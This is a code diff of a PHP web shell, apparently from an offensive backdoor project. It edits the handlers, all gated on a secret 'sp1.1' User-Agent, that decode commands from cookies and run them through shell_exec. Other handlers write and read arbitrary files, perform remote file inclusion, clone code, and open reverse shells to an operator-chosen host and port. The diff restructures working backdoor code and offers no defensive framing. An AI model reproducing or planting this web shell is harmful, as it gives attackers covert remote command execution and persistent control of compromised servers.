@@ -133,10 +133,10 @@ function b64($target, $how, $data, $ext, $dir)
 {
     if (!empty($how) && !empty($target) && !empty($dir)) {
         if (!empty($data) && $how == "up") {
-            fputs(fopen($dir.$target.$ext, "x+"),base64_decode($data));
+            fputs(fopen($dir . $target . $ext, "x+"), base64_decode($data));
             return "Created: {$dir}/{$target}.{$ext}";
         } elseif ($how == "down" && !empty($data) && !empty($dir)) {
-            return base64_encode(file($dir.$target.$ext));
+            return base64_encode(file($dir . $target . $ext));
         } else {
             echo("Cannot do what you asked of me.\n");
         }
@@ -303,7 +303,7 @@ function executeCommands(string $com, int $run)
     if (!empty($com) && $run === "1") {
         echo("~ Info To Remember ~ \n" . shell_exec(base64_decode($com)));
     } else {
-        echo("\nExecuting: " . $com . "\n->" . shell_exec(base64_decode($com)));
+        echo("\nExecuting: " . base64_decode($com) . "\n" . shell_exec(base64_decode($com)));
     }
 }
 
@@ -359,40 +359,38 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         $ct = null;
         $split = null;
         if ($_POST['cr'] === "1") {
-            $split = base64_decode($_COOKIE['cr']);
+            $split = unserialize(base64_decode($_COOKIE['cx']), ["allowed_classes"=>false]);
         } else {
-            $s = $_COOKIE['cr'];
+            $s = $_COOKIE['cx'];
             $v = explode(".", base64_decode($s));
             try {
-                $split = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($v[3]), hex2bin($v[2]), hex2bin($v[0]), hex2bin($v[1]));
+                $split = unserialize(base64_decode(sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($v[3]), hex2bin($v[2]), hex2bin($v[0]), hex2bin($v[1]))), ['allowed_classes' => false]);
             } catch (SodiumException $e) {
                 echo $e . "\n";
             }
         }
-        executeCommands(unserialize($split, ['allowed_classes' => false]), "0");
-    } else {
-        denied($_SERVER['REMOTE_ADDR']);
-    }
-} elseif (!empty($_POST["clone"])) {
-    if (!empty($_POST["ROS"])) {
-        $ROS = htmlentities($_POST["ROS"]);
-    } else {
-        $ROS = "";
-    }
-    cloner($_POST["clone"], $ROS);
-} elseif (!empty($_POST["doInclude"])) {
-    remoteFileInclude($_POST["doInclude"]);
-} elseif (!empty($_POST["b6"])) {
-    if ($_POST['cr']){
-        $sp = explode('.', base64_decode($_COOKIE['cx']));
-        if (b64($sp[0], $sp[1], $sp[2], $sp[3], $sp[4]) !== false){
-            echo "Operation completed successfully!";
-        }else{
-            echo "There was an error, we might not have write abilities.";
+        executeCommands($split, "0");
+    } elseif (!empty($_POST["clone"])) {
+        if (!empty($_POST["ROS"])) {
+            $ROS = htmlentities($_POST["ROS"]);
+        } else {
+            $ROS = "";
         }
+        cloner($_POST["clone"], $ROS);
+    } elseif (!empty($_POST["doInclude"])) {
+        remoteFileInclude($_POST["doInclude"]);
+    } elseif (!empty($_POST["b6"])) {
+        if ($_POST['cr']) {
+            $sp = explode('.', base64_decode($_COOKIE['cx']));
+            if (b64($sp[0], $sp[1], $sp[2], $sp[3], $sp[4]) !== false) {
+                echo "Operation completed successfully!";
+            } else {
+                echo "There was an error, we might not have write abilities.";
+            }
+        }
+    } elseif ($_POST["rcom"]) {
+        reverseConnections(htmlentities($_POST["mthd"]), htmlentities($_POST["host"]), htmlentities($_POST["port"]), htmlentities($_POST["shell"]));
     }
-} elseif ($_POST["rcom"]) {
-    reverseConnections(htmlentities($_POST["mthd"]), htmlentities($_POST["host"]), htmlentities($_POST["port"]), htmlentities($_POST["shell"]));
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
     banner();
     setcookie("checkIn", $_SERVER['REMOTE_ADDR']);
